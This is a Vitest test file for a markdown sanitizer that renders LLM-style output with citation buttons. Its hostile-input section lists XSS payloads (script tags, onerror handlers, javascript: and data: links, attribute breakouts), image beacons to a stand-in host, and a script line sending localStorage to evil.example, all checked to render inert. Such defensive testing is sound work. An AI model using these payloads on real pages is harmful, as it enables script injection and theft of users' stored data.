// @vitest-environment happy-dom
import { describe, expect, it } from "vitest";
import { escapeHtml, linkCitations, renderSafeMarkdown } from "./markdown";

const ALLOWED_TAGS = new Set([
  "P", "H1", "H2", "H3", "H4", "H5", "H6", "UL", "OL", "LI", "STRONG", "EM", "DEL", "CODE", "PRE",
  "BLOCKQUOTE", "TABLE", "THEAD", "TBODY", "TR", "TH", "TD", "A", "BR", "HR", "INPUT",
]);
const ALLOWED_ATTRS: Record<string, string[]> = {
  A: ["href", "title", "target", "rel"],
  TH: ["align"],
  TD: ["align"],
  OL: ["start"],
  CODE: ["class"],
  INPUT: ["type", "checked", "disabled"],
};

/**
 * Structural check on the renderer's output: parse it as a real DOM and make
 * sure it contains only formatting elements with only known-harmless
 * attributes. (Looking for strings like "onerror=" would false-positive on
 * escaped text, which is exactly what we want the renderer to produce.)
 */
function assertInert(html: string): void {
  const root = document.createElement("div");
  root.innerHTML = html;
  for (const el of Array.from(root.querySelectorAll("*"))) {
    expect(ALLOWED_TAGS.has(el.tagName), `element <${el.tagName.toLowerCase()}> in: ${html}`).toBe(true);
    const allowed = ALLOWED_ATTRS[el.tagName] ?? [];
    for (const attr of Array.from(el.attributes)) {
      expect(allowed.includes(attr.name), `attribute ${el.tagName.toLowerCase()}[${attr.name}] in: ${html}`).toBe(true);
    }
    if (el.tagName === "A") {
      expect(el.getAttribute("href") ?? "").toMatch(/^(https?:\/\/|mailto:|#)/i);
      expect(el.getAttribute("rel")).toBe("noopener noreferrer");
    }
    if (el.tagName === "INPUT") {
      expect(el.getAttribute("type")).toBe("checkbox");
      expect(el.hasAttribute("disabled")).toBe(true);
    }
    if (el.tagName === "CODE" && el.hasAttribute("class")) {
      expect(el.getAttribute("class")).toMatch(/^language-[\w+#.-]+$/);
    }
  }
}

describe("renderSafeMarkdown: formatting still works", () => {
  it("renders the usual markdown", () => {
    const html = renderSafeMarkdown("# Title\n\nSome **bold** and *italic* with `code`.\n\n- a\n- b\n\n1. one\n2. two\n");
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<em>italic</em>");
    expect(html).toContain("<code>code</code>");
    expect(html).toContain("<ul>");
    expect(html).toContain("<ol>");
  });

  it("renders tables and fenced code", () => {
    expect(renderSafeMarkdown("|a|b|\n|-|-|\n|1|2|\n")).toContain("<table>");
    expect(renderSafeMarkdown("```js\nconst x = 1 < 2;\n```")).toContain("1 &lt; 2");
  });

  it("keeps ordinary web links, opening them safely", () => {
    const html = renderSafeMarkdown("[paper](https://arxiv.org/abs/1706.03762)");
    expect(html).toContain('href="https://arxiv.org/abs/1706.03762"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
    expect(renderSafeMarkdown("[mail](mailto:a@b.co)")).toContain('href="mailto:a@b.co"');
    expect(renderSafeMarkdown("[top](#section)")).toContain('href="#section"');
  });

  it("autolinks bare URLs (gfm)", () => {
    expect(renderSafeMarkdown("see https://example.org/x now")).toContain('href="https://example.org/x"');
  });
});

describe("renderSafeMarkdown: hostile input", () => {
  const vectors: [string, string][] = [
    ["script tag", "<script>alert(1)</script>"],
    ["inline script", "hello <script>alert(1)</script> world"],
    ["img onerror (inline)", 'text <img src=x onerror="alert(1)"> text'],
    ["img onerror (block)", '<img src=x onerror="alert(1)">'],
    ["svg onload", "<svg onload=alert(1)></svg>"],
    ["iframe", '<iframe src="https://evil.example"></iframe>'],
    ["style", "<style>body{display:none}</style>"],
    ["details ontoggle", "<details open ontoggle=alert(1)>x</details>"],
    ["raw anchor", '<a href="javascript:alert(1)" onclick="alert(2)">x</a>'],
    ["form", '<form action="https://evil.example"><input name=x></form>'],
    ["html comment", "<!-- hidden --><script>alert(1)</script>"],
    ["markdown js link", "[x](javascript:alert(1))"],
    ["markdown JS link (case)", "[x](JaVaScRiPt:alert(1))"],
    ["js link with entity", "[x](&#106;avascript:alert(1))"],
    ["js link with whitespace", "[x]( javascript:alert(1))"],
    ["js link with tab/newline", "[x](java\tscript:alert(1))"],
    ["data link", "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
    ["vbscript link", "[x](vbscript:msgbox(1))"],
    ["file link", "[x](file:///etc/passwd)"],
    ["autolink js", "<javascript:alert(1)>"],
    ["reference-style js link", "[x][1]\n\n[1]: javascript:alert(1)"],
    ["markdown image tracking pixel", "![](https://evil.example/pixel.gif?secret=abc)"],
    ["markdown image with js", "![x](javascript:alert(1))"],
    ["image inside link", "[![x](https://evil.example/p.png)](https://example.org)"],
    ["attribute breakout via href", '[x](https://example.org" onmouseover="alert(1))'],
    ["attribute breakout via title", '[x](https://example.org "t\\" onmouseover=\\"alert(1)")'],
  ];

  it.each(vectors)("%s", (_name, input) => {
    assertInert(renderSafeMarkdown(input));
  });

  it("shows hostile HTML as literal, escaped text rather than dropping it silently", () => {
    const html = renderSafeMarkdown("<b onclick=x>hi</b>");
    expect(html).toContain("&lt;b onclick=x&gt;");
  });

  it("never loads remote images, but keeps the alt text", () => {
    const html = renderSafeMarkdown("![diagram of the model](https://evil.example/x.png)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("diagram of the model");
  });

  it("renders a link with an unsafe target as plain text", () => {
    const html = renderSafeMarkdown("[click me](javascript:alert(1))");
    expect(html).toContain("click me");
    expect(html).not.toContain("<a");
  });

  it("cannot break out of an attribute through a quote in the href or title", () => {
    const html = renderSafeMarkdown('[x](https://example.org/a"b "ti\\"tle")');
    assertInert(html);
    const a = document.createElement("div");
    a.innerHTML = html;
    const link = a.querySelector("a");
    expect(link?.getAttribute("href")).toContain('a"b');
    expect(link?.attributes.length).toBeLessThanOrEqual(4); // href, title, target, rel — nothing smuggled in
  });

  it("keeps GFM task-list checkboxes inert", () => {
    const html = renderSafeMarkdown("- [x] done\n- [ ] todo");
    expect(html).toContain("<input");
    assertInert(html);
  });

  it("is safe when LLM-style output mixes everything", () => {
    const html = renderSafeMarkdown(
      [
        "## Summary [1]",
        "Result: <img src=x onerror=alert(1)> and [link](javascript:alert(2)).",
        "![beacon](https://evil.example/?d=PROMPT)",
        "<script>fetch('https://evil.example?k='+localStorage)</script>",
        "[ok](https://doi.org/10.1000/xyz)",
      ].join("\n\n"),
    );
    assertInert(html);
    expect(html).toContain('href="https://doi.org/10.1000/xyz"');
    // The hostile URL may survive as visible (escaped) text, but nothing may link to or load it.
    const root = document.createElement("div");
    root.innerHTML = html;
    expect(root.querySelector('[href*="evil"], [src*="evil"], [action*="evil"]')).toBeNull();
    expect(Array.from(root.querySelectorAll("a")).map((a) => a.getAttribute("href"))).toEqual(["https://doi.org/10.1000/xyz"]);
  });
});

describe("escapeHtml", () => {
  it("escapes the five significant characters", () => {
    expect(escapeHtml(`<a href="x">'&'</a>`)).toBe("&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#39;&lt;/a&gt;");
  });
});

describe("linkCitations", () => {
  it("turns [n] into buttons for papers in range", () => {
    const out = linkCitations("<p>Claim [1] and [3].</p>", 3);
    expect(out).toContain('<button type="button" class="cite" data-cite="1">1</button>');
    expect(out).toContain('data-cite="3"');
    expect(out.startsWith("<p>Claim [")).toBe(true);
  });

  it("links every number in a list and both ends of a range", () => {
    const list = linkCitations("<p>[2, 5]</p>", 9);
    expect(list).toContain('data-cite="2"');
    expect(list).toContain('data-cite="5"');
    const range = linkCitations("<p>[2–4]</p>", 9);
    expect(range).toContain('data-cite="2"');
    expect(range).toContain('data-cite="4"');
    expect(range).not.toContain('data-cite="3"');
  });

  it("leaves out-of-range and zero markers as text", () => {
    expect(linkCitations("<p>[0] [4] [2, 9]</p>", 3)).toBe("<p>[0] [4] [2, 9]</p>");
  });

  it("does not touch markup, attributes or code", () => {
    const html = '<p><a href="https://x/[1]">t [1]</a></p><pre><code>arr[1]</code></pre><code>[2]</code>';
    const out = linkCitations(html, 5);
    expect(out).toContain('href="https://x/[1]"');
    expect(out).toContain("<code>arr[1]</code>");
    expect(out).toContain("<code>[2]</code>");
    expect(out).toContain('data-cite="1">1</button>]</a>'); // the one in link text is linkified
  });

  it("only ever emits digits into the buttons", () => {
    const out = linkCitations("<p>[1]</p>", 5);
    expect(out.match(/data-cite="(\d+)"/)?.[1]).toBe("1");
  });
});
